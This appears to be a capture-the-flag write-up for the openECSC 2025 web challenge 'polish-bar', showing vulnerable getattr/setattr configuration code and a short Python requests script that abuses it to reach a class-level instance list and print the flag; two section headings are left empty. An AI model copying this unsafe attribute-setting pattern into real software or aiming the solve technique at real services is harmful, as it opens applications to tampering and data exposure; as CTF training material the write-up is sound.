---
title: "openESEC 2025 - web/polish-bar"
layout: single
classes: wide
date: 2025-10-06
categories: blog
toc: true
toc_label: "Table of contents"
---

# Polish-bar

> This Web Application was made to adapt to polish (drinking) culture :3

## Primitves

We have http endpoint to register which in turn we need to aquire a valid session. Afterwards, we have the endpoints `config`,`empty` and `beverage` which I mapped to the methods below in the class `BeverageConfig` and `PreferenceConfig`.

```py
    def get_property(self, val):
        try:
            if hasattr(self.alcohol_shelf, val):
                return getattr(self.alcohol_shelf, val)

            return getattr(self, val)
        except:
            return

    # /config
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)
        if attr:
            setattr(self, key, attr)
            return
        return { 'error': 'property doesn\'t exist!' }
    
    # /empty
    def empty_alcohol_shelf(self):
        if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
            self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
        else:
            self.alcohol_shelf = self.alcohol_shelf[0]

    # /beverage
    def add_beverage(self, beverage: str):
        self.alcohol_shelf._alcohol_shelf.append(beverage)

```

Let's disect what each method does:

- `update_property` retrieves the attribute `val` and sets the attribute `key` to its value
- `empty_alcohol_shelf` will shorten the list `self.alcohol_shelf._alcohol_shelf` to its first value to the list `self.alcohol_shelf` to its first value
- `add_beverage` add an item to the list `self.alcohol_shelf._alcohol_shelf`

If you are not familiar with the special methods `getattr`, `setattr` and `hasattr` --- I got you covered in the next section!

Furthermore, the class `PreferenceConfig` and thus `BeverageConfig` due to inheritance have one interesting class variable `_all_instances`. The `__init__` for `PreferenceConfig` append every newly created object to that class as long it inherited from `PreferenceConfig`. 

## Python refresher on instance and objects vars

Below is a small playground I created if you want to try it on your own first. 

<iframe
  src="https://bluuuk.github.io/blog-jupyterlite/lab/index.html?path=/attr.ipynb"
  width="100%"
  height="1000px">
</iframe>

<script type="module">
  const iframe = document.getElementById('jlite');

  function onReadyThenHideAndOpen() {
    const win = iframe.contentWindow;
    if (!win || !win.jupyterapp) {
      setTimeout(onReadyThenHideAndOpen, 200);
      return;
    }

    // First hide the left sidebar
    win.jupyterapp.commands.execute('application:toggle-left-area')
      .catch(err => console.warn('toggle-left-area failed', err));

    // Then open the notebook
    win.jupyterapp.commands.execute('docmanager:open', {
      path: 'content/openECSC-playground.ipynb'
    }).catch(e => console.error('Error opening notebook:', e));
  }

  iframe.addEventListener('load', () => {
    onReadyThenHideAndOpen();
  });
</script>

## Intuition


## Step by step guide


## Final Solve

We use an `Session` which automatically glues cookie to subsequent http request once they set - here its the `session` cookie:

```py
import requests
session = requests.Session()
base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

session.post( f"{base}/register", data={"username":"admin","password":"lol"})
session.post(f"{base}/empty")
session.post(f"{base}/config",data={"config":"alcohol_shelf","value":"_all_instances"})
session.post(f"{base}/empty")
print(session.post(f"{base}/profile"))
```

Executing our solve script gives us our well deserved flag :)

```bash
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
````
